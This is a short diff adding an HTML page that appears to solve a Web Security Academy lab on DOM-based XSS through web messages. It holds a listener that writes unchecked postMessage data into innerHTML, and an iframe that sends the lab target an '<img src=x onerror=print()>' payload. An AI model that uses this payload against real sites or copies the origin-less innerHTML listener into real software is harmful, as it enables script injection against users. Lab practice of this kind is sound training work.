@@ -1,0 +1,8 @@
+<script>
+window.addEventListener('message', function(e) {
+    document.getElementById('ads').innerHTML = e.data;
+})
+</script>
+
+
+<iframe src="https://0a7d00f60469797c8168c5280079000a.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"></iframe>
